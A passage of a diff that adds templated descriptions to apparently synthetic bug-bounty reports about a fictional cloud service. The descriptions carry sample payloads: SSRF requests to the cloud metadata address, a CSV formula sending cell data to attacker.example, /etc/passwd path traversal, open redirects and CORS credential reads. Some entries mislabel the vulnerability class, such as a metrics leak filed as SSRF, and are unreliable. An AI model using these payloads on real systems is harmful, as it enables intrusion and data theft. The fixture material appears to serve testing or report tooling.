+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.nebelstein-cloud.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10599,7 +10677,8 @@
           "offset": "2d 15h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.nebelstein-cloud.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10729,7 +10808,8 @@
           "offset": "5d 17h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.nebelstein-cloud.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10865,7 +10945,8 @@
           "offset": "7d 4h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.nebelstein-cloud.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10997,7 +11078,8 @@
           "offset": "3d 14h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.nebelstein-cloud.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11112,7 +11194,8 @@
           "offset": "11h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.nebelstein-cloud.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11252,7 +11335,8 @@
           "offset": "3d 15h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.nebelstein-cloud.foo/export`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11367,7 +11451,8 @@
           "offset": "2d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.nebelstein-cloud.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11511,7 +11596,8 @@
           "offset": "3d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.nebelstein-cloud.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11631,7 +11717,8 @@
           "offset": "5d 23h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.nebelstein-cloud.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11763,7 +11850,8 @@
           "offset": "2d 3h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.nebelstein-cloud.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11871,7 +11959,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.nebelstein-cloud.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12018,7 +12107,8 @@
           "offset": "8d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.nebelstein-cloud.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12165,7 +12255,8 @@
           "offset": "5d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.nebelstein-cloud.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12297,7 +12388,8 @@
           "offset": "8d 5h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.nebelstein-cloud.foo/import`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12405,7 +12497,8 @@
           "offset": "1d 14h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.nebelstein-cloud.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12545,7 +12638,8 @@
           "offset": "4d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.nebelstein-cloud.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12657,7 +12751,8 @@
           "offset": "2d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.nebelstein-cloud.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12764,7 +12859,8 @@
           "offset": "4d 7h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.nebelstein-cloud.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12900,7 +12996,8 @@
           "offset": "3d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.nebelstein-cloud.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13048,7 +13145,8 @@
           "offset": "12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.nebelstein-cloud.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13147,7 +13245,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.nebelstein-cloud.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13281,7 +13380,8 @@
           "offset": "5d 21h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.nebelstein-cloud.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13439,7 +13539,8 @@
           "offset": "9d 6h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.nebelstein-cloud.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13590,7 +13691,8 @@
           "offset": "6d 5h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.nebelstein-cloud.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13684,7 +13786,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.nebelstein-cloud.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13852,7 +13955,8 @@
           "offset": "7d 7h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.nebelstein-cloud.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14000,7 +14104,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.nebelstein-cloud.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14128,7 +14233,8 @@
           "offset": "1d 16h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.nebelstein-cloud.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14282,7 +14388,8 @@
           "offset": "6d 5h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.nebelstein-cloud.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14414,7 +14521,8 @@
           "offset": "6d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.nebelstein-cloud.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14534,7 +14642,8 @@
           "offset": "20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
